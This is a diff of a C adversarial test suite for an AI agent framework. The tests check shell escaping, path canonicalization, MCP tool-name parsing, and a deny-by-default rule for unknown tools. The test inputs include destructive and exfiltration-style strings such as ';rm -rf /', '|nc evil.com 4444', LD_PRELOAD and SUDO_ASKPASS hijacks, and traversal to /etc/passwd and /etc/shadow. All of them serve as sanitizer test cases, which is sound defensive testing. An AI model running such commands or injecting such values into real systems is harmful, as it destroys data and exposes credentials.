@@ -1,16 +1,16 @@
 /* Adversarial tests: injection attacks — command injection, path traversal,
  * JSON injection, environment variable injection.
  * Every test uses hu_tracking_allocator_t to verify zero leaks. */
-#include "test_framework.h"
+#include "human/agent/instruction_discover.h"
+#include "human/core/allocator.h"
+#include "human/core/error.h"
 #include "human/hook.h"
 #include "human/hook_pipeline.h"
 #include "human/mcp_manager.h"
-#include "human/agent/instruction_discover.h"
 #include "human/permission.h"
-#include "human/core/allocator.h"
-#include "human/core/error.h"
-#include <string.h>
+#include "test_framework.h"
 #include <stdlib.h>
+#include <string.h>
 
 /* ══════════════════════════════════════════════════════════════════════════
  * Hook Command Injection
@@ -24,8 +24,8 @@ static void test_hook_inject_semicolon_rm(void) {
     const char *dangerous_tool = ";rm -rf /";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous_tool, strlen(dangerous_tool),
-                                          &escaped, &escaped_len);
+    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous_tool, strlen(dangerous_tool), &escaped,
+                                          &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     HU_ASSERT_NOT_NULL(escaped);
     /* Must be single-quoted — semicolon not interpreted */
@@ -47,8 +47,8 @@ static void test_hook_inject_backtick_command_sub(void) {
     const char *dangerous = "`$(whoami)`";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     /* Backticks and $() should be neutralized inside single quotes */
     HU_ASSERT(escaped[0] == '\'');
@@ -66,8 +66,8 @@ static void test_hook_inject_pipe(void) {
     const char *dangerous = "|nc evil.com 4444";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     HU_ASSERT(escaped[0] == '\'');
     alloc.free(alloc.ctx, escaped, escaped_len + 1);
@@ -84,8 +84,8 @@ static void test_hook_inject_env_var(void) {
     const char *dangerous = "KEY=val;export LD_PRELOAD=evil.so";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     HU_ASSERT(escaped[0] == '\'');
     alloc.free(alloc.ctx, escaped, escaped_len + 1);
@@ -102,8 +102,8 @@ static void test_hook_inject_newline(void) {
     const char *dangerous = "safe_tool\nrm -rf /";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     /* Newline must be safely inside single quotes */
     HU_ASSERT(escaped[0] == '\'');
@@ -139,8 +139,8 @@ static void test_hook_pipeline_tool_name_escaped(void) {
     const char *bad_tool = "$(rm -rf /)";
     hu_hook_result_t result;
     memset(&result, 0, sizeof(result));
-    hu_error_t err = hu_hook_pipeline_pre_tool(reg, &alloc, bad_tool, strlen(bad_tool),
-                                                "{}", 2, &result);
+    hu_error_t err =
+        hu_hook_pipeline_pre_tool(reg, &alloc, bad_tool, strlen(bad_tool), "{}", 2, &result);
     HU_ASSERT_EQ(err, HU_OK);
 
     /* Verify the command passed to mock had the tool name escaped */
@@ -165,8 +165,8 @@ static void test_hook_inject_single_quote_in_name(void) {
     const char *dangerous = "tool'name;id";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     /* Single quote should be properly escaped: 'tool'\''name;id' */
     HU_ASSERT_STR_CONTAINS(escaped, "'\\''");
@@ -188,8 +188,8 @@ static void test_instruction_path_traversal_etc_passwd(void) {
     const char *traversal = "../../../../../../etc/passwd";
     char *canonical = NULL;
     size_t canonical_len = 0;
-    hu_error_t err = hu_instruction_validate_path(&alloc, traversal, strlen(traversal),
-                                                   &canonical, &canonical_len);
+    hu_error_t err = hu_instruction_validate_path(&alloc, traversal, strlen(traversal), &canonical,
+                                                  &canonical_len);
     /* If it succeeds, the canonical path should be the resolved absolute path,
      * not containing ".." */
     if (err == HU_OK && canonical) {
@@ -209,8 +209,8 @@ static void test_instruction_path_absolute_nonexistent(void) {
     const char *path = "/nonexistent_adversarial_test_path_12345/file.md";
     char *canonical = NULL;
     size_t canonical_len = 0;
-    hu_error_t err = hu_instruction_validate_path(&alloc, path, strlen(path),
-                                                   &canonical, &canonical_len);
+    hu_error_t err =
+        hu_instruction_validate_path(&alloc, path, strlen(path), &canonical, &canonical_len);
     /* Should fail — path doesn't exist, realpath fails */
     if (err != HU_OK) {
         HU_ASSERT_NULL(canonical);
@@ -231,9 +231,8 @@ static void test_instruction_path_null_byte_injection(void) {
     char bad_path[] = "/tmp\0../../etc/shadow";
     char *canonical = NULL;
     size_t canonical_len = 0;
-    hu_error_t err = hu_instruction_validate_path(&alloc, bad_path,
-                                                   sizeof(bad_path) - 1,
-                                                   &canonical, &canonical_len);
+    hu_error_t err = hu_instruction_validate_path(&alloc, bad_path, sizeof(bad_path) - 1,
+                                                  &canonical, &canonical_len);
     /* Should detect null byte in path and reject */
     if (err == HU_OK && canonical) {
         HU_ASSERT(strstr(canonical, "shadow") == NULL);
@@ -252,8 +251,8 @@ static void test_instruction_path_double_encoded(void) {
     const char *encoded = "/tmp/%2e%2e/%2e%2e/etc/passwd";
     char *canonical = NULL;
     size_t canonical_len = 0;
-    hu_error_t err = hu_instruction_validate_path(&alloc, encoded, strlen(encoded),
-                                                   &canonical, &canonical_len);
+    hu_error_t err =
+        hu_instruction_validate_path(&alloc, encoded, strlen(encoded), &canonical, &canonical_len);
     /* The %2e encoding is literal characters — realpath should handle or fail */
     if (err == HU_OK && canonical) {
         alloc.free(alloc.ctx, canonical, canonical_len + 1);
@@ -295,8 +294,7 @@ static void test_mcp_json_proto_key(void) {
 
     const char *srv = NULL, *tool = NULL;
     size_t srv_len = 0, tool_len = 0;
-    bool parsed = hu_mcp_tool_parse_name("mcp____proto____tool", &srv, &srv_len,
-                                          &tool, &tool_len);
+    bool parsed = hu_mcp_tool_parse_name("mcp____proto____tool", &srv, &srv_len, &tool, &tool_len);
     /* Parse should work — server name is "__proto__", tool is "tool" */
     if (parsed) {
         HU_ASSERT_EQ(srv_len, 10); /* "__proto__" */
@@ -313,8 +311,8 @@ static void test_mcp_json_constructor_key(void) {
 
     const char *srv = NULL, *tool = NULL;
     size_t srv_len = 0, tool_len = 0;
-    bool parsed = hu_mcp_tool_parse_name("mcp__constructor__valueOf", &srv, &srv_len,
-                                          &tool, &tool_len);
+    bool parsed =
+        hu_mcp_tool_parse_name("mcp__constructor__valueOf", &srv, &srv_len, &tool, &tool_len);
     HU_ASSERT_TRUE(parsed);
     /* Server is "constructor", tool is "valueOf" */
     HU_ASSERT_EQ(srv_len, 11);
@@ -349,8 +347,8 @@ static void test_mcp_numeric_key_overflow(void) {
     /* Tool name with very large number */
     char *built = NULL;
     size_t built_len = 0;
-    hu_error_t err = hu_mcp_tool_build_name(&alloc, "server", "99999999999999999999",
-                                             &built, &built_len);
+    hu_error_t err =
+        hu_mcp_tool_build_name(&alloc, "server", "99999999999999999999", &built, &built_len);
     if (err == HU_OK) {
         HU_ASSERT_NOT_NULL(built);
         alloc.free(alloc.ctx, built, built_len + 1);
@@ -372,8 +370,8 @@ static void test_hook_env_ld_preload(void) {
     const char *dangerous = "LD_PRELOAD=/tmp/evil.so tool_exec";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     /* Must be safely quoted */
     HU_ASSERT(escaped[0] == '\'');
@@ -391,8 +389,8 @@ static void test_hook_env_path_override(void) {
     const char *dangerous = "PATH=/tmp/evil:$PATH bash";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     HU_ASSERT(escaped[0] == '\'');
     alloc.free(alloc.ctx, escaped, escaped_len + 1);
@@ -409,8 +407,8 @@ static void test_hook_env_sudo_askpass(void) {
     const char *dangerous = "SUDO_ASKPASS=/tmp/evil.sh sudo -A id";
     char *escaped = NULL;
     size_t escaped_len = 0;
-    hu_error_t err = hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous),
-                                          &escaped, &escaped_len);
+    hu_error_t err =
+        hu_hook_shell_escape(&alloc, dangerous, strlen(dangerous), &escaped, &escaped_len);
     HU_ASSERT_EQ(err, HU_OK);
     HU_ASSERT(escaped[0] == '\'');
     alloc.free(alloc.ctx, escaped, escaped_len + 1);
@@ -419,17 +417,21 @@ static void test_hook_env_sudo_askpass(void) {
     hu_tracking_allocator_destroy(ta);
 }
 
-/* 20. Permission: unknown tool defaults to DANGER level */
-static void test_permission_unknown_tool_defaults_danger(void) {
+/* 20. Permission: unknown tool returns HU_PERM_DENY — a sentinel above every
+   agent-assignable tier so no agent (even DANGER_FULL_ACCESS) can invoke it.
+   (Renamed in audit follow-up; the old "defaults_danger" name described the
+   pre-DENY behavior and confused readers debugging failures.) */
+static void test_permission_unknown_tool_returns_deny(void) {
     hu_permission_level_t level = hu_permission_get_tool_level("totally_unknown_tool_xyz");
-    HU_ASSERT_EQ(level, HU_PERM_DANGER_FULL_ACCESS);
+    HU_ASSERT_EQ(level, HU_PERM_DENY);
+    HU_ASSERT_FALSE(hu_permission_check(HU_PERM_DANGER_FULL_ACCESS, level));
 }
 
-/* 21. Permission: NULL tool name should not crash */
+/* 21. Permission: NULL tool name returns DENY and does not crash. */
 static void test_permission_null_tool_name(void) {
     hu_permission_level_t level = hu_permission_get_tool_level(NULL);
-    /* Should return highest restriction or handle gracefully */
-    HU_ASSERT_EQ(level, HU_PERM_DANGER_FULL_ACCESS);
+    HU_ASSERT_EQ(level, HU_PERM_DENY);
+    HU_ASSERT_FALSE(hu_permission_check(HU_PERM_DANGER_FULL_ACCESS, level));
 }
 
 /* ══════════════════════════════════════════════════════════════════════════
@@ -467,6 +469,6 @@ void run_adversarial_injection_tests(void) {
     HU_RUN_TEST(test_hook_env_sudo_askpass);
 
     /* Permission defaults */
-    HU_RUN_TEST(test_permission_unknown_tool_defaults_danger);
+    HU_RUN_TEST(test_permission_unknown_tool_returns_deny);
     HU_RUN_TEST(test_permission_null_tool_name);
 }
